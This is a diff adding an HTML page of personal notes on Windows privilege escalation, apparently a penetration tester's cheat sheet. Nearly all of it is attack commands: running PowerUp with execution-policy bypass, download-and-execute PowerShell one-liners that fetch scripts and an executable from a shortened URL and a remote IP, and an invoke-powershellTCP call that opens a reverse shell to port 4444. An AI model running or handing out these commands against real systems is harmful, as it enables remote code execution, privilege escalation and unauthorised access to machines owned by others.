@@ -1,0 +1,34 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>PrivEscal</title>
+</head><body>https://github.com/m0nad/awesome-privilege-escalation<br/>
+<br/>
+<br/>
+Windows powerup &gt; https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1<br/>
+Usage<br/>
+<ul><li>C:&gt; powershell.exe -nop -exec bypass</li>
+</ul>
+meterpreter &gt; powershell_execute<ul><li>PS C:\&gt;<b> Import-Module PowerUp.ps1</b></li>
+</ul>
+<br/>
+Get-Help Get-ServiceEXEPerms -full   &lt; get list of all the available functions<br/>
+output your results to a file, I recommend using the Powershell Out-File cmdlet, I.E. ​”PS C:\&gt; <br/>
+<br/>
+Download PowerUp <ul><li>C:\&gt; powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”</li>
+</ul>
+<br/>
+<img src="image.png"/><br/>
+<br/>
+<br/>
+------------------------------------------------------------------------------------<br/>
+<span style="font-size: 16pt">Powershell get download link<br/>
+<br/>
+</span><br/>
+<div style="text-align: left"><span style="font-family: Ubuntu"><span style="font-size: 12pt">powershell &quot;(New-Object System.Net.WebClient).Downloadfile('http://&lt;ip&gt;:8000/shell-name.exe','shell-name.exe')&quot;</span><span style="font-size: 16pt"><br/>
+</span></span></div><br/>
+Downloadstring, execute using parameters for script:<br/>
+&gt; powershell invoke-expression (New-Object Net.WebClient).DownloadString('http://10.13.17.108/invoke-powershellTCP.ps1');invoke-powershellTCP -Reverse -IPAddress 10.13.17.108 -Port 4444<br/>
+<br/>
+with shell in plaace execute with<br/>
+     Start-Process &quot;whatever.exe&quot;</body></html>
